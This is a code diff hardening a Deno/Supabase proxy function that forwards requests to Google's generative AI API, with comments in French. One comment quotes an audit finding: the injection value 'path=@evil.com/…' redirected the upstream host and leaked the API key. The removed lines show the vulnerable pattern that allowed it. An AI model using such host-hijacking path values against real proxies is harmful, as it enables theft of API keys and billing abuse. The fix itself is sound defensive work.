@@ -3,104 +3,69 @@
 //
 // Déployé à : https://guvwgiejzkiodghywpwj.supabase.co/functions/v1/google-ai-proxy
 //
-// Endpoints supportés (via ?path=) :
-//   POST ?path=/v1beta/models/imagen-4.0-generate-001:predict           → Imagen 4 (sync)
-//   POST ?path=/v1beta/models/veo-3.1-fast-generate-preview:predictLongRunning → Veo 3.1 (async start)
-//   GET  ?path=/v1beta/OPERATION_NAME                                   → Poll opération Veo
+// Endpoints supportés (via ?path=) — ALLOWLIST STRICTE :
+//   POST ?path=/v1beta/models/<model>:predict            → Imagen (sync)          [FACTURANT]
+//   POST ?path=/v1beta/models/<model>:predictLongRunning → Veo (async start)      [FACTURANT]
+//   POST ?path=/v1beta/models/<model>:generateContent    → Gemini / Nano Banana   [FACTURANT]
+//   GET  ?path=/v1beta/models/<model>/operations/<id>    → poll d'une opération   [non facturant]
+//   GET  ?path=/v1beta/operations/<id>                   → poll d'une opération   [non facturant]
 //
-// Sécurité : seuls les utilisateurs authentifiés (JWT Supabase valide) peuvent appeler ce proxy.
+// Sécurité (audit 05/09) :
+//   • `?path=` validé + résolu contre la base (C2 : `path=@evil.com/…` détournait l'hôte et la clé
+//     partait EN CLAIR dans la query string). La clé passe désormais en en-tête x-goog-api-key.
+//   • appels facturants : plafond par utilisateur + preuve de débit récent (H3).
 
 import { serve } from 'https://deno.land/std@0.168.0/http/server.ts'
-import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
-
-const CORS = {
-  'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
-  'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
-}
+import { CORS, jsonRes, authUser, safeUpstream, billableGate, helperGate } from '../_shared/guard.ts'
 
 const GOOGLE_AI_BASE = 'https://generativelanguage.googleapis.com'
+// + GET /v1beta/files/<id>:download?alt=media = téléchargement d'une vidéo Veo (clé côté serveur)  [non facturant]
+const ALLOW = /^\/v1beta\/(models\/[A-Za-z0-9._-]+:(predict|predictLongRunning|generateContent)|models\/[A-Za-z0-9._-]+\/operations\/[A-Za-z0-9._-]+|operations\/[A-Za-z0-9._-]+|files\/[A-Za-z0-9._-]+:download)$/
+const BILLABLE = /:(predict|predictLongRunning|generateContent)$/
 
 serve(async (req: Request) => {
-  // Preflight CORS
-  if (req.method === 'OPTIONS') {
-    return new Response('ok', { headers: CORS })
-  }
+  if (req.method === 'OPTIONS') return new Response('ok', { headers: CORS })
+  if (req.method !== 'POST' && req.method !== 'GET') return jsonRes(405, { error: 'method_not_allowed' })
 
-  // ── Vérification JWT ──
-  const authHeader = req.headers.get('Authorization') ?? ''
-  const token = authHeader.replace('Bearer ', '').trim()
-  if (!token) {
-    return new Response(JSON.stringify({ error: 'Unauthorized — token manquant' }), {
-      status: 401,
-      headers: { ...CORS, 'Content-Type': 'application/json' },
-    })
-  }
+  const auth = await authUser(req)
+  if (!auth.token) return jsonRes(401, { error: 'Unauthorized — token manquant' })
+  if (!auth.isService && !auth.userId) return jsonRes(401, { error: 'Unauthorized — session invalide ou expirée' })
 
-  const supabaseUrl  = Deno.env.get('SUPABASE_URL') ?? ''
-  const supabaseAnon = Deno.env.get('SUPABASE_ANON_KEY') ?? ''
-  const supabase = createClient(supabaseUrl, supabaseAnon, {
-    global: { headers: { Authorization: `Bearer ${token}` } },
-  })
-
-  const { data: { user }, error: authErr } = await supabase.auth.getUser()
-  if (authErr || !user) {
-    return new Response(JSON.stringify({ error: 'Unauthorized — session invalide ou expirée' }), {
-      status: 401,
-      headers: { ...CORS, 'Content-Type': 'application/json' },
-    })
-  }
-
-  // ── Clé Google AI depuis les secrets Supabase ──
   const googleKey = Deno.env.get('GOOGLE_AI_KEY') ?? ''
-  if (!googleKey) {
-    return new Response(JSON.stringify({ error: 'GOOGLE_AI_KEY not configured in Supabase secrets' }), {
-      status: 500,
-      headers: { ...CORS, 'Content-Type': 'application/json' },
-    })
+  if (!googleKey) return jsonRes(500, { error: 'GOOGLE_AI_KEY not configured in Supabase secrets' })
+
+  const url = new URL(req.url)
+  const apiPath = url.searchParams.get('path') ?? ''
+  if (!apiPath) return jsonRes(400, { error: 'Paramètre ?path= manquant' })
+  const up = safeUpstream(GOOGLE_AI_BASE, apiPath, ALLOW)
+  if (!up.ok) return jsonRes(400, { error: 'path refusé : ' + up.reason })
+  const bare = new URL(up.url).pathname
+  const isBillable = req.method === 'POST' && BILLABLE.test(bare)
+  if (req.method === 'GET' && BILLABLE.test(bare)) return jsonRes(405, { error: 'method_not_allowed' })
+
+  if (!auth.isService && auth.userId) {
+    const gate = isBillable
+      ? await billableGate({ userId: auth.userId, proxy: 'google', requireDebit: true, rateMax: 30, label: bare })
+      : await helperGate(auth.userId, 'google', 240)   // polling toutes les ~3 s pendant une génération Veo
+    if (!gate.ok) return jsonRes(gate.status, { error: gate.error })
   }
 
   try {
-    const url     = new URL(req.url)
-    const apiPath = url.searchParams.get('path') ?? ''
-    if (!apiPath) {
-      return new Response(JSON.stringify({ error: 'Paramètre ?path= manquant' }), {
-        status: 400,
-        headers: { ...CORS, 'Content-Type': 'application/json' },
-      })
-    }
-
-    const googleUrl = `${GOOGLE_AI_BASE}${apiPath}?key=${googleKey}`
-
+    const headers: Record<string, string> = { 'x-goog-api-key': googleKey }
     let googleRes: Response
-
     if (req.method === 'GET') {
-      // ── Poll opération Veo (GET) ──
-      googleRes = await fetch(googleUrl, { method: 'GET' })
+      googleRes = await fetch(up.url, { method: 'GET', headers })
     } else {
-      // ── POST (Imagen 4 ou Veo start) ──
       const rawBody = await req.text()
-      googleRes = await fetch(googleUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: rawBody,
-      })
+      googleRes = await fetch(up.url, { method: 'POST', headers: { ...headers, 'Content-Type': 'application/json' }, body: rawBody })
     }
-
     const body = await googleRes.text()
-
     return new Response(body, {
       status: googleRes.status,
-      headers: {
-        ...CORS,
-        'Content-Type': googleRes.headers.get('content-type') ?? 'application/json',
-      },
+      headers: { ...CORS, 'Content-Type': googleRes.headers.get('content-type') ?? 'application/json' },
     })
   } catch (err) {
     console.error('google-ai-proxy error:', err)
-    return new Response(JSON.stringify({ error: String(err) }), {
-      status: 500,
-      headers: { ...CORS, 'Content-Type': 'application/json' },
-    })
+    return jsonRes(502, { error: 'upstream_error' })
   }
 })
